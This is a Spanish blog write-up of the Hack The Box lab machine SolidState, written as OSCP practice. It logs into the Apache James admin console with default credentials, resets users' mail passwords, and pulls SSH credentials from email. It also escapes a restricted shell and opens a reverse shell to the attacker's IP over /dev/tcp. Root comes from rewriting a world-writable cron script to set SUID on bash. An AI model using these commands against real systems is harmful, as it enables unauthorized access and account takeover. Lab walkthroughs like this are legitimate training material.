---
layout: post
title:  "OSCP Path ~ SolidState de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada SOLIDSTATE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Mail, smtpd, PopD, Remote Admin, Maquinas Retiradas, Writeup, Hacking
---

# SolidState ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.51      "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.218 [10.10.16.218]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Chequeamos que es esto de `JAMES Remote Admin 2.3.2` con searchsploit
```bash
# searchsploit James  2.3.2
--------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                    |  Path
--------------------------------------------------------------------------------------------------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)            | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                            | linux/remote/35513.py
--------------------------------------------------------------------------------------------------------------------------
```
Nos Descargamos el exploit en python, y vemos que las credenciales que usa por defecto son validas, probamos a conectarnos con `telnet` al servicio
`James Remote Admin 2.3.2`
```bash
Probamos a conectarnos via telnet por el servicio JAMES Remote Admin 2.3.2
# telnet 10.10.10.51 4555                                                                                                                       1 ⚙
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
user rootJAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id: root
Password: root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
 Conseguimos entrar y listamos los usuarios que hay para el servicio, viendo los comando que podemos usar, vemos que existe el comando `setpassword` parasetear las contraseñas de los usuarios a la que nosotros queramos, lo hacemos.
 ```bash
 Unknown command set password
setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset
```
Como habiamos visto en el archivo `el scaneo de nmap` tambien teniamos el servicio de `pop3` o `correo_electronico`
Probamos a meternos con los distintos usuarios anteriores.
```bash
Para el user:
              user mindy
              pass mindy
---------------------------------------- 2 Mails ---------------------------
1
2
-----------------------------------------------------------------------------
retr 2 -→ encontramos credenciales en el mail.
-------------------- Credenciales obtenidas en el Mail 2 --------------------------
"Username: mindy          "
"pass: P@55W0rd1!2@       "
```

Con estas credenciales probamos a conectarnos al servicio `SSH` que se encontraba abierto.
```bash
# ssh mindy@10.10.10.51                                                                                                                  
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
0510e71c2e8c9xxxxxxxxxxxxxxx0dc2
```
Intentando enumerar un poco el sistema vemos que no estamos en una `bash`, sino en un `R-bash` que solo nos permite usar unos trees comandos.
Nos salimos de SSH y procedemos a realizar de nuevo la conexion de la siguiente forma para escaparnos del contexto de la `r-bash`

```bash
# ssh mindy@10.10.10.51 bash    
```
Una vez que nos hemos escapado del contexto de la `r-bash` procedemos a enviarnos un `r-shell` con el comando:
```bash
bash -i >& /dev/tcp/10.10.14.12/443 0>&1
```
Nos ponemos a la escucha con `Netcat` y nos montamos un server con python3 para pasar el archivo `pspy32s` a la ruta `/tmp/` 
```bash
recibimos la conexion, y procedemos a pasarnos el archivo pspy32s
para ver si hay tareas cron ejecutandose a nivel de sistema"
2021/07/16 12:33:01 CMD: UID=0    PID=1483   | python /opt/tmp.py " 
2021/07/16 12:33:01 CMD: UID=0    PID=1484   | sh -c rm -r /tmp/* 
```
Nos detecta una tarea que esta ejecutando el administrador en la ruta `/opt/tmp.py`
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls                                                                                                                     
james-2.3.2  tmp.py 

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l
total 8                                                                                                                                                                                                             
drwxr-xr-x 11 root root 4096 Apr 26 12:37 james-2.3.2                                                                                                                           
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py 
```

Como podemos escribir en la tarear modificamos la misma para que nos ejecute a nivel de sistema el comando que nosotros queramos
```bash
#!/usr/bin/env python

import os
import sys

try:
      os.system('chmod u+s /bin/bash')
except:
      sys.exit(1)
```

Procedemos a hacer un bash -p 
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ nano tmp.py 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ watch -n 1 'ls -l /bin/bash'
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ bash -p
bash-4.4# whoami 
root
4f4afb55463c3bc79axxxxxxxxx4953d
```

Maquina Rooteada =)
